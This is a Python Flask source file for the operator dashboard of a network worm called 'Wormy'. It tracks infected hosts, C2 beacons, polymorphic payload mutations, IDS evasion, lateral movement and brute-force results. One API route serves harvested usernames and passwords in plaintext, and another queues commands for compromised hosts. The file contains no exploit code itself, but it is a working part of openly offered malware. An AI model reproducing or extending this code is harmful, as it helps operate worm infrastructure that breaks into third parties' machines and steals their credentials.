"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Web GUI Dashboard v2.0
Professional Flask-based web interface with Chart.js graphs,
real-time monitoring, and interactive controls
"""

import json
import logging
import os
import sys
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger

# ── Silence Flask/Werkzeug access logs (they pollute Rich Live TUI) ───────────
logging.getLogger("werkzeug").setLevel(logging.ERROR)
logging.getLogger("flask.app").setLevel(logging.ERROR)

try:
    from flask import Flask, jsonify, render_template_string, request

    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False
    logger.warning("Flask not installed: pip install flask")


class WebDashboard:
    """
    Professional Web Dashboard for Wormy v2.0

    Features:
    - Real-time host monitoring with Chart.js graphs
    - Network topology visualization
    - Exploit chain tracking
    - Credential management
    - Activity feed
    - Statistics and charts
    - Command execution interface
    """

    def __init__(self, worm_core=None, host: str = "0.0.0.0", port: int = 5000):
        self.worm = worm_core
        self.host = host
        self.port = port
        self.app = None
        self._thread = None

        if not FLASK_AVAILABLE:
            logger.error("Flask not available, Web Dashboard disabled")
            return

        self.app = Flask(__name__)
        self._setup_routes()
        logger.info(f"Web Dashboard v2.0 initialized on {host}:{port}")

    def _setup_routes(self):
        @self.app.route("/")
        def index():
            return render_template_string(self._get_dashboard_html())

        @self.app.route("/api/status")
        def api_status():
            return jsonify(self._get_status_data())

        @self.app.route("/api/hosts")
        def api_hosts():
            return jsonify(self._get_hosts_data())

        @self.app.route("/api/activity")
        def api_activity():
            limit = request.args.get("limit", 50, type=int)
            return jsonify(self._get_activity_data(limit))

        @self.app.route("/api/vulnerabilities")
        def api_vulnerabilities():
            return jsonify(self._get_vulnerabilities_data())

        @self.app.route("/api/credentials")
        def api_credentials():
            return jsonify(self._get_credentials_data())

        @self.app.route("/api/topology")
        def api_topology():
            return jsonify(self._get_topology_data())

        @self.app.route("/api/stats")
        def api_stats():
            return jsonify(self._get_stats_data())

        @self.app.route("/api/command", methods=["POST"])
        def api_command():
            data = request.json
            host_ip = data.get("host_ip", "")
            command = data.get("command", "")
            return jsonify({"status": "queued", "host": host_ip, "command": command})

    def _get_status_data(self) -> Dict:
        if not self.worm:
            return {"error": "WormCore not available"}
        return {
            "running": self.worm.running,
            "infected_hosts": len(self.worm.infected_hosts),
            "failed_targets": len(self.worm.failed_targets),
            "total_discovered": self.worm.stats.get("total_hosts_discovered", 0),
            "vulnerabilities": self.worm.stats.get("vulnerabilities_found", 0),
            "exploit_chains": self.worm.stats.get("exploit_chains_built", 0),
            "lateral_movements": f"{self.worm.stats.get('lateral_success', 0)}/{self.worm.stats.get('lateral_movements', 0)}",
            "brute_force": f"{self.worm.stats.get('brute_force_successes', 0)}/{self.worm.stats.get('brute_force_attempts', 0)}",
            "credentials": self.worm.stats.get("credentials_discovered", 0),
            "c2_beacons": self.worm.stats.get("c2_beacons", 0),
            "polymorphic_mutations": self.worm.stats.get("polymorphic_mutations", 0),
            "start_time": self.worm.start_time.isoformat() if self.worm.start_time else None,
        }

    def _get_hosts_data(self) -> List[Dict]:
        if not self.worm or not self.worm.host_monitor:
            return []
        hosts = []
        for ip, host_state in self.worm.host_monitor.hosts.items():
            hosts.append(
                {
                    "ip": ip,
                    "os": host_state.os_guess,
                    "status": host_state.status,
                    "health": host_state.health_score,
                    "detection_risk": host_state.detection_risk,
                    "cpu": host_state.cpu_usage,
                    "memory": host_state.memory_usage,
                    "payload_variant": host_state.payload_variant,
                    "infected_at": host_state.infected_at.isoformat(),
                    "last_beacon": host_state.last_beacon.isoformat(),
                    "activities": len(host_state.activity_log),
                    "credentials_found": len(host_state.credentials_found),
                    "lateral_movements": len(host_state.lateral_movement_history),
                }
            )
        return hosts

    def _get_activity_data(self, limit: int = 50) -> List[Dict]:
        if not self.worm or not self.worm.host_monitor:
            return []
        return self.worm.host_monitor.get_activity_feed(limit=limit)

    def _get_vulnerabilities_data(self) -> List[Dict]:
        vulns = []
        if not self.worm:
            return vulns
        for host in self.worm.scan_results:
            for v in host.get("vulnerabilities", []):
                vulns.append(
                    {
                        "host": host["ip"],
                        "cve": v.get("cve", "N/A"),
                        "name": v.get("name", "Unknown"),
                        "severity": v.get("severity", "UNKNOWN"),
                        "cvss": v.get("cvss", 0),
                        "description": v.get("description", ""),
                    }
                )
        return vulns

    def _get_credentials_data(self) -> List[Dict]:
        if not self.worm or not self.worm.cred_manager:
            return []
        creds = self.worm.cred_manager.get_discovered_credentials()
        return [{"username": u, "password": p, "source": "discovered"} for u, p in creds]

    def _get_topology_data(self) -> Dict:
        nodes, edges = [], []
        if not self.worm:
            return {"nodes": [], "edges": []}
        for host in self.worm.scan_results:
            ip = host["ip"]
            is_infected = ip in self.worm.infected_hosts
            is_failed = ip in self.worm.failed_targets
            status = "infected" if is_infected else ("failed" if is_failed else "discovered")
            nodes.append(
                {
                    "id": ip,
                    "label": ip,
                    "status": status,
                    "os": host.get("os_guess", "Unknown"),
                    "ports": host.get("open_ports", []),
                }
            )
        if self.worm.host_monitor:
            for ip, host_state in self.worm.host_monitor.hosts.items():
                for lm in host_state.lateral_movement_history:
                    edges.append(
                        {
                            "from": ip,
                            "to": lm.get("target", ""),
                            "label": lm.get("technique", ""),
                            "success": lm.get("success", False),
                        }
                    )
        return {"nodes": nodes, "edges": edges}

    def _get_stats_data(self) -> Dict:
        if not self.worm:
            return {}
        stats = {**self.worm.stats}
        if self.worm.start_time:
            stats["start_time"] = self.worm.start_time.isoformat()
        if self.worm.stats.get("end_time"):
            stats["end_time"] = self.worm.stats["end_time"].isoformat()
        if self.worm.host_monitor:
            stats["host_monitor"] = self.worm.host_monitor.get_statistics()
        if self.worm.ids_evasion:
            stats["evasion"] = self.worm.ids_evasion.get_statistics()
        return stats

    def _get_dashboard_html(self) -> str:
        return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wormy — Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <style>
        :root {
            --bg: #09090b; --surface: #18181b; --border: #27272a;
            --text: #fafafa; --muted: #a1a1aa; --accent: #22c55e;
            --danger: #ef4444; --warn: #eab308; --info: #3b82f6;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
        .topbar { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; border-bottom: 1px solid var(--border); background: var(--surface); }
        .topbar h1 { font-size: 1.1rem; font-weight: 600; letter-spacing: -0.02em; }
        .topbar h1 span { color: var(--accent); }
        .topbar-right { display: flex; align-items: center; gap: 12px; }
        .badge { padding: 4px 10px; border-radius: 9999px; font-size: 0.75rem; font-weight: 500; text-transform: uppercase; letter-spacing: 0.05em; }
        .badge-green { background: #22c55e22; color: var(--accent); border: 1px solid #22c55e44; }
        .badge-red { background: #ef444422; color: var(--danger); border: 1px solid #ef444444; }
        .btn { background: var(--surface); border: 1px solid var(--border); color: var(--text); padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; transition: all 0.15s; }
        .btn:hover { border-color: var(--accent); color: var(--accent); }
        .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
        .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 12px; margin-bottom: 24px; }
        .stat { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 16px; }
        .stat-label { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; }
        .stat-value { font-size: 1.5rem; font-weight: 600; color: var(--accent); }
        .panel { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 16px; }
        .panel-head { padding: 12px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .panel-head h2 { font-size: 0.85rem; font-weight: 500; }
        .panel-body { padding: 16px; }
        .charts { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }
        @media (max-width: 900px) { .charts { grid-template-columns: 1fr; } }
        .chart-box { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 16px; }
        .chart-box h3 { font-size: 0.8rem; font-weight: 500; margin-bottom: 12px; color: var(--muted); }
        table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
        th { text-align: left; padding: 8px 12px; color: var(--muted); font-weight: 500; border-bottom: 1px solid var(--border); text-transform: uppercase; letter-spacing: 0.05em; font-size: 0.7rem; }
        td { padding: 8px 12px; border-bottom: 1px solid var(--border); }
        tr:last-child td { border-bottom: none; }
        .dot { display: inline-block; width: 6px; height: 6px; border-radius: 50%; margin-right: 6px; }
        .dot-green { background: var(--accent); }
        .dot-red { background: var(--danger); }
        .dot-blue { background: var(--info); }
        .sev { padding: 2px 6px; border-radius: 4px; font-size: 0.7rem; font-weight: 500; }
        .sev-CRITICAL { background: #ef444422; color: var(--danger); }
        .sev-HIGH { background: #f9731622; color: #f97316; }
        .sev-MEDIUM { background: #eab30822; color: var(--warn); }
        .sev-LOW { background: #22c55e22; color: var(--accent); }
        .activity { display: flex; gap: 12px; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 0.8rem; align-items: center; }
        .activity:last-child { border-bottom: none; }
        .activity-time { color: var(--muted); font-family: 'SF Mono', 'Fira Code', monospace; font-size: 0.75rem; min-width: 65px; }
        .activity-type { padding: 2px 8px; border-radius: 4px; background: var(--border); color: var(--accent); font-size: 0.7rem; min-width: 90px; text-align: center; }
        .activity-host { color: var(--info); min-width: 130px; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 0.75rem; }
        .activity-details { color: var(--muted); }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
    </style>
</head>
<body>
    <div class="topbar">
        <h1><span>●</span> Wormy</h1>
        <div class="topbar-right">
            <span class="badge badge-green" id="status-badge">Running</span>
            <button class="btn" onclick="refreshAll()">Refresh</button>
        </div>
    </div>
    <div class="container">
        <div class="stat-grid" id="stats-grid">
            <div class="stat"><div class="stat-label">Infected</div><div class="stat-value" id="stat-infected">0</div></div>
            <div class="stat"><div class="stat-label">Discovered</div><div class="stat-value" id="stat-discovered" style="color:var(--info)">0</div></div>
            <div class="stat"><div class="stat-label">Vulnerabilities</div><div class="stat-value" id="stat-vulns" style="color:var(--danger)">0</div></div>
            <div class="stat"><div class="stat-label">Exploit Chains</div><div class="stat-value" id="stat-chains">0</div></div>
            <div class="stat"><div class="stat-label">Lateral Move</div><div class="stat-value" id="stat-lateral" style="font-size:1rem">0/0</div></div>
            <div class="stat"><div class="stat-label">Credentials</div><div class="stat-value" id="stat-creds" style="color:var(--warn)">0</div></div>
            <div class="stat"><div class="stat-label">C2 Beacons</div><div class="stat-value" id="stat-c2">0</div></div>
            <div class="stat"><div class="stat-label">Mutations</div><div class="stat-value" id="stat-poly">0</div></div>
        </div>
        <div class="charts">
            <div class="chart-box"><h3>Host Status</h3><canvas id="hostChart"></canvas></div>
            <div class="chart-box"><h3>Propagation</h3><canvas id="progressChart"></canvas></div>
            <div class="chart-box"><h3>Vulnerability Severity</h3><canvas id="vulnChart"></canvas></div>
            <div class="chart-box"><h3>Credential Types</h3><canvas id="credChart"></canvas></div>
        </div>
        <div class="panel">
            <div class="panel-head"><h2>Hosts</h2></div>
            <div class="panel-body" style="padding:0;overflow-x:auto;">
                <table><thead><tr><th>IP</th><th>OS</th><th>Status</th><th>Health</th><th>Risk</th><th>Payload</th><th>Events</th></tr></thead><tbody id="hosts-tbody"></tbody></table>
            </div>
        </div>
        <div class="panel">
            <div class="panel-head"><h2>Vulnerabilities</h2></div>
            <div class="panel-body" style="padding:0;overflow-x:auto;">
                <table><thead><tr><th>Host</th><th>Name</th><th>Severity</th><th>CVSS</th><th>CVE</th></tr></thead><tbody id="vulns-tbody"></tbody></table>
            </div>
        </div>
        <div class="panel">
            <div class="panel-head"><h2>Activity</h2></div>
            <div class="panel-body" id="activity-feed" style="max-height:300px;overflow-y:auto;"></div>
        </div>
    </div>
    <script>
        let hostChart, progressChart, vulnChart, credChart;
        let progressHistory = [];
        const cd = { responsive: true, plugins: { legend: { labels: { color: '#a1a1aa', font: { size: 11 } } } }, scales: { x: { ticks: { color: '#71717a' }, grid: { color: '#27272a' } }, y: { ticks: { color: '#71717a' }, grid: { color: '#27272a' } } } };
        function initCharts() {
            hostChart = new Chart(document.getElementById('hostChart'), { type: 'doughnut', data: { labels: ['Infected', 'Discovered', 'Failed'], datasets: [{ data: [0,0,0], backgroundColor: ['#22c55e','#3b82f6','#ef4444'], borderWidth: 0, hoverOffset: 4 }] }, options: { cutout: '65%', plugins: { legend: { position: 'bottom', labels: { color: '#a1a1aa', padding: 16, font: { size: 11 } } } } } });
            progressChart = new Chart(document.getElementById('progressChart'), { type: 'line', data: { labels: [], datasets: [{ label: 'Infected', data: [], borderColor: '#22c55e', backgroundColor: '#22c55e15', fill: true, tension: 0.4, pointRadius: 0, borderWidth: 2 }] }, options: { ...cd, scales: { ...cd.scales, x: { display: false }, y: { ...cd.scales.y, beginAtZero: true } }, plugins: { legend: { display: false } } } });
            vulnChart = new Chart(document.getElementById('vulnChart'), { type: 'bar', data: { labels: ['Critical', 'High', 'Medium', 'Low'], datasets: [{ data: [0,0,0,0], backgroundColor: ['#ef4444','#f97316','#eab308','#22c55e'], borderRadius: 4, barPercentage: 0.6 }] }, options: { ...cd, plugins: { legend: { display: false } } } });
            credChart = new Chart(document.getElementById('credChart'), { type: 'bar', data: { labels: ['SSH', 'SMB', 'Web', 'DB', 'Other'], datasets: [{ data: [0,0,0,0,0], backgroundColor: ['#3b82f6','#22c55e','#eab308','#a855f7','#71717a'], borderRadius: 4, barPercentage: 0.6 }] }, options: { ...cd, plugins: { legend: { display: false } } } });
        }
        function updateCharts(s) {
            hostChart.data.datasets[0].data = [s.infected_hosts||0, (s.total_discovered||0)-(s.infected_hosts||0)-(s.failed_targets||0), s.failed_targets||0];
            hostChart.update();
            progressHistory.push(s.infected_hosts||0);
            if (progressHistory.length > 20) progressHistory.shift();
            progressChart.data.labels = progressHistory.map((_,i)=>i+1);
            progressChart.data.datasets[0].data = [...progressHistory];
            progressChart.update();
        }
        function refreshAll() {
            fetch('/api/status').then(r=>r.json()).then(d => {
                document.getElementById('stat-infected').textContent = d.infected_hosts||0;
                document.getElementById('stat-discovered').textContent = d.total_discovered||0;
                document.getElementById('stat-vulns').textContent = d.vulnerabilities||0;
                document.getElementById('stat-chains').textContent = d.exploit_chains||0;
                document.getElementById('stat-lateral').textContent = d.lateral_movements||'0/0';
                document.getElementById('stat-creds').textContent = d.credentials||0;
                document.getElementById('stat-c2').textContent = d.c2_beacons||0;
                document.getElementById('stat-poly').textContent = d.polymorphic_mutations||0;
                const b = document.getElementById('status-badge');
                b.textContent = d.running ? 'Running' : 'Stopped';
                b.className = 'badge ' + (d.running ? 'badge-green' : 'badge-red');
                updateCharts(d);
            });
            loadHosts(); loadVulns(); loadActivity();
        }
        function loadHosts() {
            fetch('/api/hosts').then(r=>r.json()).then(h => {
                const t = document.getElementById('hosts-tbody');
                if (!h.length) { t.innerHTML = '<tr><td colspan="7" style="color:#71717a;padding:24px;text-align:center;">No hosts yet</td></tr>'; return; }
                t.innerHTML = h.map(x => { const dot = x.status==='infected'?'green':x.status==='failed'?'red':'blue'; return `<tr><td style="font-family:'SF Mono','Fira Code',monospace;font-size:0.75rem;"><span class="dot dot-${dot}"></span>${x.ip}</td><td style="color:#a1a1aa;">${x.os}</td><td style="text-transform:capitalize;">${x.status}</td><td>${x.health.toFixed(0)}%</td><td>${x.detection_risk.toFixed(0)}%</td><td style="font-family:'SF Mono','Fira Code',monospace;font-size:0.75rem;">${x.payload_variant}</td><td>${x.activities}</td></tr>`; }).join('');
            });
        }
        function loadVulns() {
            fetch('/api/vulnerabilities').then(r=>r.json()).then(v => {
                const t = document.getElementById('vulns-tbody');
                if (!v.length) { t.innerHTML = '<tr><td colspan="5" style="color:#71717a;padding:24px;text-align:center;">No vulnerabilities</td></tr>'; return; }
                const sc = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
                v.forEach(x => { if (sc[x.severity]!==undefined) sc[x.severity]++; });
                vulnChart.data.datasets[0].data = [sc.CRITICAL,sc.HIGH,sc.MEDIUM,sc.LOW];
                vulnChart.update();
                t.innerHTML = v.slice(0,20).map(x => `<tr><td style="font-family:'SF Mono','Fira Code',monospace;font-size:0.75rem;">${x.host}</td><td>${x.name}</td><td><span class="sev sev-${x.severity}">${x.severity}</span></td><td>${x.cvss}</td><td style="color:#71717a;">${x.cve}</td></tr>`).join('');
            });
        }
        function loadActivity() {
            fetch('/api/activity').then(r=>r.json()).then(a => {
                const f = document.getElementById('activity-feed');
                if (!a.length) { f.innerHTML = '<p style="color:#71717a;padding:16px;text-align:center;">No activity yet</p>'; return; }
                f.innerHTML = a.slice(0,30).map(x => `<div class="activity"><span class="activity-time">${x.timestamp?x.timestamp.substring(11,19):''}</span><span class="activity-type">${x.type}</span><span class="activity-host">${x.host_ip||''}</span><span class="activity-details">${x.details||''}</span></div>`).join('');
            });
        }
        setInterval(refreshAll, 5000);
        window.onload = () => { initCharts(); refreshAll(); };
    </script>
</body>
</html>
"""

    def run(self, debug: bool = False):
        if not FLASK_AVAILABLE:
            return
        import logging as _log

        _log.getLogger("werkzeug").setLevel(_log.ERROR)
        logger.info(f"Starting Web Dashboard v2.0 on {self.host}:{self.port}")
        self.app.run(
            host=self.host,
            port=self.port,
            debug=False,  # never debug — it spawns a second process
            threaded=True,
            use_reloader=False,  # prevents double-start on Windows
        )

    def run_background(self):
        if not FLASK_AVAILABLE:
            return None
        self._thread = threading.Thread(target=self.run, daemon=True)
        self._thread.start()
        logger.info(f"Web Dashboard v2.0 running in background on {self.host}:{self.port}")
        return self._thread
